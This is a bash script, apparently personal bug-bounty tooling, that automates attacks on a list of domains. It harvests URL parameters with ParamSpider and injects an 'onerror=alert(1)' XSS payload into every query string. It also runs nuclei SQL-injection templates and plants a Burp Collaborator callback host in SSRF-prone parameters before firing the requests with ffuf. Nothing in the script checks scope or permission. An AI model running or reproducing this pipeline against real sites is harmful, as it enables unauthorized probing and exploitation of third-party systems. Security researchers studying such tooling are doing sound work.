#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'


echo -e ${RED}"##################################################################"
echo -e ${CP}"                                                                 #"                                                  
echo -e ${CP}"       ██╗██████╗░██████╗░░█████╗░██╗░░██╗██╗███╗░░░███╗         #"
echo -e ${CP}"       ██║██╔══██╗██╔══██╗██╔══██╗██║░░██║██║████╗░████║         #"
echo -e ${CP}"       ██║██████╦╝██████╔╝███████║███████║██║██╔████╔██║         #"
echo -e ${CP}"       ██║██╔══██╗██╔══██╗██╔══██║██╔══██║██║██║╚██╔╝██║         #"
echo -e ${CP}"       ██║██████╦╝██║░░██║██║░░██║██║░░██║██║██║░╚═╝░██║         #"
echo -e ${CP}"       ╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝         #"
echo -e ${CP}"         Automate XSS SQLI SSRF                                  #"                                           
echo -e ${BLUE}"           https://facebook.com/ibraheem_haxor                   #"  
echo -e ${YELLOW}"              Coded By: ibrahim Haxor                            #"
echo -e ${CG}"              https://github.com/ibrahimhaxor                    #"
echo -e ${RED}"################################################################## \n "

for i in `cat $1`; do

python3 ParamSpider/paramspider.py -d $i --exclude woff,css,js,png,svg,jpg

done;


cat /home/ibrahim/output/https:/*.txt | tee /home/ibrahim/0luckyxss/sub2.txt

cat /home/ibrahim/0luckyxss/sub2.txt | sed 's/FUZZ/ /g' >> /home/ibrahim/0luckyxss/sub3.txt
echo -e ${YELLOW}" CHECKING FOR REPLECTED XSS"
cat /home/ibrahim/0luckyxss/sub3.txt | gf xss | qsreplace '"><img src=x onerror=alert(1);>' | freq >> /home/ibrahim/0luckyxss/subfreq.txt
cat /home/ibrahim/0luckyxss/sub3.txt | kxss >> /home/ibrahim/0luckyxss/subkxss.txt
cat /home/ibrahim/0luckyxss/sub3.txt | qsreplace '"><img src=x onerror=alert(1);>' >> /home/ibrahim/0luckyxss/subqsreplace.txt
echo -e ${RED}" CHECKING FOR SQL INJECTION"
cat /home/ibrahim/0luckyxss/sub3.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/ibrahim-templates/sqli/ -o /home/ibrahim/0luckyxss/subnuclei.txt
echo -e ${YELLOW}" CHECKING FOR SSRF"
cat /home/ibrahim/0luckyxss/sub3.txt | gf ssrf | grep "=" | qsreplace http://vpocwqsw64d9jc0amnrna5d4rvxlla.burpcollaborator.net >> /home/ibrahim/0luckyxss/subssrf.txt

ffuf -u "FUZZ" -w /home/ibrahim/0luckyxss/subssrf.txt -mc 200



